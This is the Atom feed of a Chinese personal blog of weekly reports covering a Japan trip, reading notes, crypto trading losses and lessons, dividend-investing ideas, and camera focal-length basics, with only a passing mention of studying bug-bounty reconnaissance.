<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>s4mmy&#39;s blog</title>
  
  <subtitle>Welcome!</subtitle>
  <link href="https://mizore.site/atom.xml" rel="self"/>
  
  <link href="https://mizore.site/"/>
  <updated>2025-03-09T17:37:06.250Z</updated>
  <id>https://mizore.site/</id>
  
  <author>
    <name>s4mmy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>周报2025-3-9-思考脚手架</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52025-3-9/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52025-3-9/</id>
    <published>2025-03-09T16:36:46.689Z</published>
    <updated>2025-03-09T17:37:06.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>把《道氏理论》捡起来继续读了，配合新的读书笔记以及阅读时的思考方法，目前成效不错。</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p><strong>读书笔记</strong></p><p>在回顾之前做的读书笔记时，发现以前的笔记基本上是在做段落摘抄，联想到《刻意练习》里面提到<strong>从事有目的的练习十分重要，不能只是漫无目的地重复同样的动作，而不知道提高与进步的清晰目标。</strong>因此我决定需要给自己的笔记制定一套“练习方法”，在未来做笔记的过程中去运用以提高自己的笔记质量。</p><p>后来去问了deepseek确实获得了一些不错的建议。从日本回来后就把这些建议整理起来并在阅读《道氏理论》的过程中加以实践。</p><p>虽然deepseek给的建议挺不错的，但是实践起来发现还是有一些问题。比如阅读前的绘制知识地图，我在绘制前去网上查了相关资料，只查到一堆很复杂的图表，作为阅读前绘制的东西有些不太现实。我尝试在xmind里用绘制思维导图的方式去画知识地图，也尝试过OneNote绘制思维象限图，但最终我只能绘制出一些贫瘠的线条的空荡荡的小方格。也许这对于现在的我来说还是有难，于是这点被我暂时搁置了。</p><p>然后就是“阅读中的解构三问”和“批判性思维触发器”，我实践起来有种卡壳的感觉，感觉并不是书中所有内容都适用这些方法。也许只是我现在运用得还不够熟练吧。</p><p>deepseek给我的建议还是一定程度上改变了我现在记笔记的习惯，比如现在我在阅读到一些观点会联想到自己的经历，并把这个联想记录下来——看到“小型折返走势”时，联想到前段时间特朗普宣布加密货币储备，导致两天内加密货币暴涨，但后面又跌回去，这个暴涨的走势就是一个小型折返走势。</p><p><strong>笔记不是记忆的墓碑，而是思考的脚手架。</strong>希望自己以后能够更加熟练地去运用这个脚手架。</p><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>无</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>无</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;把《道氏理论》捡起来继续读了，配合新的读书笔记以及阅读时的思考方法，目前成效不错。&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a href=&quot;#信息</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2025-3-2-日本之旅</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52025-3-2-%E6%97%A5%E6%9C%AC%E4%B9%8B%E6%97%85/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52025-3-2-%E6%97%A5%E6%9C%AC%E4%B9%8B%E6%97%85/</id>
    <published>2025-03-02T16:28:50.327Z</published>
    <updated>2025-03-03T13:25:04.242Z</updated>
    
    <content type="html"><![CDATA[<h1 id="日本之旅"><a href="#日本之旅" class="headerlink" title="日本之旅"></a>日本之旅</h1><p>由于在日本的旅程占用了一周时间，故本周周报与上周周报结合。</p><p>在日本的旅程发生了很多事，有开心有生气，总体来说是一个体验复杂的旅程。</p><h2 id="摩擦与冲突"><a href="#摩擦与冲突" class="headerlink" title="摩擦与冲突"></a>摩擦与冲突</h2><p><strong>与友人x的冲突</strong></p><p>​邀请友人x与我一起旅游，是因为在以前和友人x的相处过程中，我觉得友人x是一个聊天起来很舒服的人，他有很多话题能聊，而且大部分时候挺会照顾人。在我的预想中与友人x一起旅游会是一段精彩的旅程。</p><p>​但实际上友人x在旅游的过程中不断指责我犯的大小错误，例如导航错路，时间计划不够完美等。当然，这些事情确实是我的错误，但是最让我难以忍受的事情有两件：</p><ul><li>在某个复杂街区按导航走路被其指责绕路，认为应该确认目的地后按自己的路线走</li><li>由于找错书包中物品的格子而被当众大声斥责，这件事令我十分生气，并且他并没有为此事而向我道歉</li></ul><p>​我认为以上两件事都是无关紧要的小事，但是友人x的指责令我十分生气，我认为完全没有必要因为这种小事而去指责别人。同时，友人x在指责过后还会补上一些类似安慰的话，像打一个巴掌给一个糖一样。我甚至怀疑他是在无意间进行PUA。</p><p>​总之经过这次旅程，我对友人x有了新的认知，他并不是我原来想象中那种理想的朋友类型，他也有很多缺点。我也体会到了为什么之前网上经常有文章说情侣去旅游一趟回来多半吵架分手，在旅游途中会发生冲突的地方实在太多了。经过此次旅程我未来与友人x的关系应该会慢慢变淡，因为旅途中大大小小的事情实在令我生气，而且友人x也从未道歉。</p><p><strong>与友人K的经历</strong></p><p>​与友人k的小摩擦我早有预料，虽然不是什么大事，但还是有点影响旅行体验。友人k自第二天开始就与我们其他人分道扬镳，自己逛自己的旅程。当然自己逛自己的旅程没什么问题，毕竟大家都是出来玩的，如果同样的情况换做是我，我也大概率会脱离大部队自己玩自己的。</p><p>​但是我还是希望在未来的旅行中，能找到全程都愿意待在一起，志同道合的人一起旅游。</p><p><strong>一些感想</strong></p><p>做攻略这件事真的是吃力不讨好，攻略做得好大家不会对你有多少夸赞，做不好的话如果遇到一些压力怪，就会各种压力，会容易让人血压飙升。</p><h2 id="体验好的部分"><a href="#体验好的部分" class="headerlink" title="体验好的部分"></a>体验好的部分</h2><p><strong>涩谷sky</strong></p><p>​涩谷sky是我去过最好的城市观景台。精心身设计的电梯穿梭动画与到达音效，登上观景台阶梯后，第一眼映入的东京都市楼房与紫红色晚霞，直接拉满我对涩谷sky的第一印象。头顶偶尔上掠过的喷气客机与脚底下繁忙的涩谷十字路口，休憩座位上播放的西方爵士音乐，一切都是那么恰到好处。</p><p>​躺在停机坪旁的用网编成的躺床仰望夜空，以前的我也幻想过能躺在草地上仰望星空，现在我以截然相反的方式实现了曾经的幻想，东京的秩序与草原的纯粹，也许这就是生活，用你意想不到的方式实现曾经的目标。</p><p><strong>富士山</strong></p><p>​原本计划严密的富士山游玩路线，因为对电车的计划失误而面临可能错过巴士的局面。对自己失误的后悔与内疚交织着担心朋友指责的焦虑充斥着当时的我。不过最后还是幸运地赶上了巴士。</p><p>​孤单的忠灵塔与熙熙攘攘的人群，只有几个人的河口湖美术馆公园，返程路上在桥上随手拍下的富士山与日本的乡下民居。真正的富士山不在网红打卡点和明信片的取景框里，而在那些计划之外的裂缝中生长。</p><p><strong>镰仓</strong></p><p>​在镰仓，纪念品商店中的老爷爷店主，像是电影中标配的有故事的人。江之岛前，在阵雨前捕捉到富士山的满足感，远处的云朵如日漫中那般垂悬天际。在镰仓高校，江之电经过的叮当声与海浪的二重奏，被海风腌入味的沙滩与打卡的人群，未来一定还会再来慢慢逛上一天。</p><p><strong>浅草寺&amp;秋叶原</strong></p><p>​在浅草寺抽到了凶签，而朋友抽到了大吉。。。其实凶签并不会让我的心情变差，我虽然看重仪式感，但并不是太相信这种类似宿命论的抽签结果。</p><p>​秋叶原就是简单的买买买，并没有什么好说的。</p><p><img src="/%E5%91%A8%E6%8A%A52025-3-2.assets/image-20250303170202031.png" alt="image-20250303170202031"></p><p><img src="/%E5%91%A8%E6%8A%A52025-3-2.assets/image-20250303170157241.png" alt="image-20250303170157241"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;日本之旅&quot;&gt;&lt;a href=&quot;#日本之旅&quot; class=&quot;headerlink&quot; title=&quot;日本之旅&quot;&gt;&lt;/a&gt;日本之旅&lt;/h1&gt;&lt;p&gt;由于在日本的旅程占用了一周时间，故本周周报与上周周报结合。&lt;/p&gt;
&lt;p&gt;在日本的旅程发生了很多事，有开心有生气，总体来说是</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2025-2-16-个人资产配置“建议”</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52025-2-16-%E4%B8%AA%E4%BA%BA%E8%B5%84%E4%BA%A7%E9%85%8D%E7%BD%AE%E2%80%9C%E5%BB%BA%E8%AE%AE%E2%80%9D/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52025-2-16-%E4%B8%AA%E4%BA%BA%E8%B5%84%E4%BA%A7%E9%85%8D%E7%BD%AE%E2%80%9C%E5%BB%BA%E8%AE%AE%E2%80%9D/</id>
    <published>2025-02-15T11:36:24.856Z</published>
    <updated>2025-03-02T07:33:21.848Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>开始看《道氏理论》了，希望能把读书笔记坚持下去</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p><a href="https://www.bilibili.com/video/BV11zf6YyEWn">UP主 史诗级韭菜：个人对朋友们对财富规划建议</a></p><p>UP主在这个视频中主要的思想是在年轻时要攒钱配置一些优质资产（能稳定产生现金流），<strong>实现个人兜底性现金流的打造</strong></p><p>“让被动收入的现金流覆盖自己的生活开支，实现最低级的财富自由”，这和我之前在小德的视频中看到的观点是相同的。（小德这期视频观点似乎也是从《穷爸爸富爸爸》这本书中提炼出来的）</p><p>UP主在对未来的看法中，认为大部分人未来存在明显的中年危机，把收入寄托在长期贩卖劳动力或者创业，是高风险且不适合普通正常人的。这点我是十分认同的。</p><p>对于能产生稳定现金流的资产，UP主提出要优先考虑的是<strong>非周期的、具备强壁垒的红筹股结合一些低风险的固收债，要打造出一个低风险、分散的高分母高股息的组合，强化自己低风险获得被动收入的模式</strong>，我自己对股市的了解没有那么多，未来要加强学习了解，争取在领到第一份工资之前打造出适合自己的资产组合。</p><p>UP主也提到在个人没人被动型自由现金流达到能覆盖自己的生活成本之前，个人应该尽量削减不必要的开支，同时在个人财富的分配上尽量原理高风险的投机模式，否则非常容易让自己积累的劳动力收入一朝回到解放前。这点对于刚经历币圈黑天鹅的我深有感受，上杠杆+扛单等操作真的非常高风险的操作。</p><p>UP主在后面提到适合的标的有</p><ul><li>股息率大于4-5%的具备一定垄断性和规模的红筹股</li><li>必须搭配一些与市场波动无关的长寨（尤其是10-30年期的国债etf）</li></ul><p>需要注意的是：（以下出自原文）</p><blockquote><p>但由于目前市场的情况特殊，长期收益率在3.5%以上的10年期国债目前仅有1.8%利率，都不如一些普通的红筹股的股息，同时30年期的也仅有2%，而目前的短期融资债，比如短融ETF依然能做到一年2%不到一点，也就意味着长债的收益率被短期融资覆盖，因此目前的市场建议用短融ETF取代固收配置，同时结合A股高于4%股息的稳定非周期企业，比如伊利、五粮液，亦或者体量足够，购买一些更高股息的H股，比如四大行H、移动H、长和长实、福寿园等。尽量减少对小市值烟蒂的配置</p></blockquote><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>无</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>好快啊，上周感觉还在过年，这周日就已经到学校了。</p><p>距离去日本的日期越来越近了，还是有点期待！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;开始看《道氏理论》了，希望能把读书笔记坚持下去&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a href=&quot;#信息&quot; class=&quot;headerlin</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2025-2-9</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52025-2-9/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52025-2-9/</id>
    <published>2025-02-09T17:35:04.827Z</published>
    <updated>2025-02-09T18:11:05.347Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>无</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>无</p><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>山寨大暴跌打击好大。。。。重新审视了自己之前的投资策略，发现自己还是有太多问题了，从这周起要开始指定自己的交易计划，并完善自己的交易策略。下面把自己学习到的一些知识搬过来，就当复习了。</p><h2 id="交易计划"><a href="#交易计划" class="headerlink" title="交易计划"></a>交易计划</h2><p>一个交易计划，应该有明确的入场点和出场点，以及他们的理由，自己的预期以及可以接受的损失。</p><p>交易计划还应该涵盖市场变化时要如何应对，把所有可能一一列举，在开仓之前就完全接受任何结果，确保每一笔交易决策不是出于一时冲动或者或者混乱的情绪，而是基于实现设定的规则和目标。</p><p>坚持风险管理原则，风险管理原则应该考虑到自己的个人财物状况，风险偏好，以及当前市场的整体波动。</p><p>同时要避免过度交易。</p><h2 id="过度交易"><a href="#过度交易" class="headerlink" title="过度交易"></a>过度交易</h2><p>任何偏离计划，不在计划内的交易，或者质量差的交易设置或者策略，都算过度交易。</p><p>例如：追涨杀跌的交易，交易前没有明确的计划或者交易策略的交易。又或者没有计划的情绪化的交易（在5min线，15min线内疯狂找点位交易）</p><h2 id="纪律-amp-总结"><a href="#纪律-amp-总结" class="headerlink" title="纪律&amp;总结"></a>纪律&amp;总结</h2><ul><li>在走出明显行情前不玩合约</li><li>主玩现货</li><li>上涨之后要开始分批卖出</li><li>抄底慢慢抄</li><li>不要频繁交易</li><li>使用做空来对冲下跌风险</li><li>要设置止盈止损</li><li>现货做左侧交易</li><li>合约做右侧顺势交易</li><li>定期回顾与评估</li></ul><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>这周和几个高中同学见了一面，自己在高中毕业之后就很少联系之前的同学了，除了几个关系比较好的。也不知道今年过后还有没有机会这样每年见一面了。我在见面前还有点担心见面没多少共同话题，导致没话说的尴尬情况。不过见面后感觉也还好，互相调侃调侃，问问近况，再聊聊其他高中同学的八卦，感觉也没想象中的那么难。不过我希望自己以后能锻炼出跟大部分人都很能聊得来的能力吧哈哈。</p><p>合约平仓后亏了好多钱，基本上钱全亏光了，只剩下一点老本。不过庆幸的是还是留下了一点点筹码，没有全部被爆仓清空。虽然亏了很多钱，但是再也没有之前合约开着的时候那种担惊受怕的状态了，反而整个人都很放松，不用再天天看盘，担心被割资金费率。以后还是主玩现货为主，合约杠杆真的太耗神耗力，对生活影响太大。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;无&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a href=&quot;#信息&quot; class=&quot;headerlink&quot; title=&quot;信息&quot;&gt;&lt;/a&gt;信息&lt;/</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2025-2-3</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52025-2-4/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52025-2-4/</id>
    <published>2025-02-03T17:22:59.420Z</published>
    <updated>2025-02-03T17:53:06.145Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>无</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>无</p><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>无</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>日本之旅的计划基本完毕，剩下的就是办visa卡和买富士山车票。</p><p>唉，这两天山寨币大跌，真的难受，从今天起要建立起自己的交易系统，不能再乱开合约了。</p><p>之前玩合约太难受了，晚上经常守夜睡不着，不设置止损一直扛单。落得今天这个下场也是咎由自取，要吸取教训，以后主玩现货，杠杆只当做工具。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;无&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a href=&quot;#信息&quot; class=&quot;headerlink&quot; title=&quot;信息&quot;&gt;&lt;/a&gt;信息&lt;/</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2025-1-26</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52025-1-26/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52025-1-26/</id>
    <published>2025-01-25T18:14:52.871Z</published>
    <updated>2025-01-28T17:02:41.557Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>无</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>无</p><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>无</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>日本计划终于接近尾声了，这周写了个脚本抢了涩谷sky的票，剩下吧最后一天行程和富士山车票安排好就行了。</p><p>这周看了古惑仔前两部，还是挺有意思的，有时间把剩下的几部也补了。</p><p>这周体验了一下三角洲，感觉还是挺好玩的，可能是因为薯薯太多了捞起来很爽，所以游戏体验比COD和战地要好很多哈哈。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;无&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a href=&quot;#信息&quot; class=&quot;headerlink&quot; title=&quot;信息&quot;&gt;&lt;/a&gt;信息&lt;/</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2025-1-19</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52025-1-19/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52025-1-19/</id>
    <published>2025-01-19T17:41:42.713Z</published>
    <updated>2025-01-19T17:51:49.838Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>无</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>无</p><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>看了SRC挖掘的信息收集教程，还是有学到一些东西。不过比较还没做。。还是比较懒最近。</p><p>写到这里突然有个想法，把自己学过的攻击手法与ATT&amp;CK的框架结合起来，构建一个属于自己的渗透测试框架。</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>把日本的机票酒店都订好了，剩下的就是把涩谷sky的票抢好应该就没什么问题了。</p><p>把赌博默示录的第一季补完了，这部番刚开始还是挺有意思的，不过到了后面让我感觉有点套路化。。。</p><p>这周末突然特朗普竟然发币了，不过因为自己对于meme币了解不多，学习也不深入，所以不敢梭哈，错过了一次暴富机会QAQ，以后要加强币圈这方面的知识积累。</p><p>到了今晚写周记的时候感觉好像什么都没做这周就过去了，自己越来越堕落了。。。还是得加把劲，多做点有用的事情吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;无&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a href=&quot;#信息&quot; class=&quot;headerlink&quot; title=&quot;信息&quot;&gt;&lt;/a&gt;信息&lt;/</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2025-1-12</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52025-1-12/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52025-1-12/</id>
    <published>2025-01-06T08:44:51.867Z</published>
    <updated>2025-01-13T17:31:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>无</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>在知乎上看到的，很有感触，先搬运到自己的博客，希望日后能提醒自己，让自己明白内心想要追求的东西。</p><h2 id="为什么中国社会容错率显得那么低？其他国家容错率也跟中国一样吗？"><a href="#为什么中国社会容错率显得那么低？其他国家容错率也跟中国一样吗？" class="headerlink" title="为什么中国社会容错率显得那么低？其他国家容错率也跟中国一样吗？"></a>为什么中国社会容错率显得那么低？其他国家容错率也跟中国一样吗？</h2><p>我想，可能是因为因为很多人都觉得自己是永生的我本科时候有一个室友，是从偏远地区来的，成绩很好，他平常是非常唯物的类型，我想很多人都见过这种人。</p><p>然而有一天晚上，他却躺在床上，非常悲伤的对我说，他突然意识到了他有一天会死，会离开这个世界，一想到这件事他就感到无法控制的恐惧大部分人不敢真正去面对死亡，即使理性上知道自己总有一天会死，但他们在潜意识里也没有把这件事认真对待，于是久而久之，便在不知不觉中认为自己是永生的在这种逻辑下，暂时的忍耐也是可以接受的了，毕竟自己是永生的。这真的是太值得了，我们只需要小心翼翼、低声下气、忍辱负重地度过那关键的十年、关键的二十年、关键的三十年、关键的四十年、关键的五十年、关键的六十年…便可以享受后面一劳永逸的永生了但反过来说，你犯的任何一点小错，人生轨迹中的任何一点差池，便会使你在接下来的永生中一直受到它的侵害。再叠加上无神论思想，这个世界不关心你，这个世界不回答你，没有任何人可以宽恕你，没有任何人可以救赎你，你会永远的活着，并且永远的煎熬。</p><p>于是贫穷的人煎熬着，在残酷的竞争中向上攀爬。富有的人煎熬着，在惴惴不安中守护自己的地位。我们的大脑空空如也，坐在荒芜的原野上，就像古老时代的猿猴一般恐惧未来——“我们经过的日子、都在你震怒之下。我们度尽的年岁、好像一声叹息。我们一生的年日是七十岁。若是强壮可到八十岁。但其中所矜夸的、不过是劳苦愁烦。转眼成空、我们便如飞而去。”是的，我们终究会死，做错的事情会得到宽恕，费尽心机得到的东西也会离你而去。死亡本身就是一个奇迹，它就像礼物一般，最终被赠与给所有人，使我们可以从这个世界上被接走，前往下一段旅程。</p><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>学习了一些投资知识，这次先把复利这个概念搬上来。</p><p>复利，简单说就是，假如你有100w本金，今年翻10倍，明年翻10倍，一点一点滚雪球，最终达成千倍万倍的收益。<br>但现实中很难做到复利，因为只要一犯大错就会中断复利。</p><p>踏空行情不算大错，做错止损也不是大错，只有高倍杠杆抗单最终割肉爆仓才是大错。只要翻一次大错，复利就会被终止。</p><p>10次大行情，哪怕踏空五次，做错两次但止损，只要抓住剩余3次两倍，三倍甚至十倍的收益。但是如果翻了大错，会一下子全部亏光。<br>不管是踏空还是做错止损都没关系，只要不犯大错，复利就能进行下去，早晚会获得高收益。保住本金，不翻大错，就还会有翻身机会，还能进行复利。</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>终于完成了日本旅行的路线规划，不过樱花季的住宿和交通都好贵，不得不把旅行计划提到一个月前了，这几天得加速把机票酒店还有签证搞定了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;无&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a href=&quot;#信息&quot; class=&quot;headerlink&quot; title=&quot;信息&quot;&gt;&lt;/a&gt;信息&lt;/</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2025-1-5</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52025-1-5/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52025-1-5/</id>
    <published>2025-01-04T17:29:22.132Z</published>
    <updated>2025-01-05T18:27:32.031Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>无</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>无</p><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>学习了一些相机相关知识</p><h3 id="焦段"><a href="#焦段" class="headerlink" title="焦段"></a>焦段</h3><p>不同的焦段会有不同的拍摄效果，也就是平时所说的广角镜头，标准镜头，长焦镜头</p><ul><li><p><strong>10mm~35mm&#x2F;广角镜头：</strong></p><p>广角适合全身&#x2F;大半身人像，以及开阔的场景</p><p>广角拍摄人像特点：</p><ol><li>显高显腿长</li><li>近距离也能让画面有更多的画面元素</li><li>适合低角度仰拍</li></ol><p>ps：广角不适合拍人像特写，不然会显得脸很大，如果要拍的话可以给人像添加前景来规避这个问题。同时使用广角拍摄人物的时候人物要尽量往中间靠，因为广角镜头的四周会有畸变</p><p>广角其他特点：</p><ol><li>能拍出线条纵深感，人物的互动感</li><li>拍摄的画面更有空间感和视觉张力</li></ol></li><li><p><strong>40~60mm&#x2F;标准镜头：</strong></p><p>标准头常见的是50mm焦段</p><p>标准镜头特点：</p><ol><li>接近人眼观看视觉，容易拍出互动感，“男友视角“，可以把脸拍的好看”</li><li>不出现畸变</li><li>拍出来的视角平淡</li></ol><p>标准镜头进可攻退可守，能胜任大部分景别。</p><p>脚贴画面边缘，头顶留空的这个技巧就是用在标准镜头拍全身上</p></li><li><p><strong>85mm~135mm&#x2F;中长焦镜头：</strong></p><p>其中85mm焦段非常适合人像拍摄，适合近身（半身）特写照。</p><p>利用长焦的空间压缩感，只拍摄想让观众看到的那部分，会让画面更整洁。</p><p>中长焦镜头特点：</p><ol><li>适合特写，中近景必备，半脸，大脸特等局部写很适合（85mm）</li><li>拍摄出来的画面有空间压缩感</li><li>带有背景虚化的效果，边缘不会畸变</li></ol><p>长焦不仅能拍近景，在拍大场景时可以拍出人景合一的效果，场景元素在画面中充分展示，主体放在画面上合适的位置即可</p></li></ul><p><strong>新手练习拍摄要在拍摄前先确定焦段，多用走位构图，少用变焦构图</strong></p><p>可以先简单记住</p><ul><li>拍摄特写，近景，半身：50mm以上</li><li>拍全身，大景，全景：50mm以下</li></ul><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>这周手机无缘无故坏了，网上一查普遍说法是手机虚焊，真是服了，花了一天的时间查问题，后面还是决定旧手机拿去修+买新手机。</p><p>旧手机贪便宜找网上寄修，结果中招了，手机寄过去后奸商以莫名其妙的理由要多收钱，同意加价修但不愿意走闲鱼，奸商真坑啊，最后还是决定手机寄回来，亏了邮费也不让他赚这个钱。先把手机保存好，以后再找机会修修吧。</p><p>唉，算是又上了一课，网上的套路可真是多啊，防不胜防。可惜了旧手机的照片导不出来。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;无&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a href=&quot;#信息&quot; class=&quot;headerlink&quot; title=&quot;信息&quot;&gt;&lt;/a&gt;信息&lt;/</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2024-12-29</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-29/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-29/</id>
    <published>2024-12-29T15:28:25.599Z</published>
    <updated>2024-12-29T15:36:27.540Z</updated>
    
